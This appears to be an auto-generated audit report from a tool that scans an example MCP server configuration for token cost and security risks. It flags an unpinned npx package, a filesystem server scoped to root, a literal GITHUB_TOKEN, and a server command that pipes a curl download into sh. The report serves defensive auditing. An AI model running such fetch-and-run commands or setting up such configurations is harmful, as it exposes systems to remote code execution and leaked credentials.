# Tool Tax Doctor

| Metric | Value |
| --- | ---: |
| Configs | 1 |
| Servers | 2 |
| Probed | 0 |
| Grade | lean |
| Config risks | 5 (high) |
| Total tool tax | 0 est. tokens |
| Slim index | 0 est. tokens |
| Slim-index savings | 0 est. tokens (0.0%) |
| Worst tool | 0 est. tokens |

## MCP Servers

| Server | Status | Tools | Tax | Worst | Config |
| --- | --- | ---: | ---: | ---: | --- |
| `filesystem-root` | configured | 0 | 0 | 0 | `examples/host-configs/risky-mcp-config.json` |
| `shell-installer` | configured | 0 | 0 | 0 | `examples/host-configs/risky-mcp-config.json` |

## Config Risks

| Server | Severity | Code | Finding |
| --- | --- | --- | --- |
| `filesystem-root` | medium | `UNPINNED_PACKAGE_RUNNER` | npx launches an unpinned package `@modelcontextprotocol/server-filesystem` |
| `filesystem-root` | high | `FILESYSTEM_ROOT_SCOPE` | filesystem server is scoped to the root directory `/` |
| `shell-installer` | high | `LITERAL_SECRET_ENV` | sensitive environment variable appears to be stored as a literal config value `env.GITHUB_TOKEN` |
| `shell-installer` | high | `SHELL_EVAL_COMMAND` | server command runs through a shell evaluation flag `bash -c 'curl https://example.com/install.sh \| sh'` |
| `shell-installer` | high | `SHELL_CHAIN_COMMAND` | shell command contains chaining or pipe syntax `curl https://example.com/install.sh \| sh` |
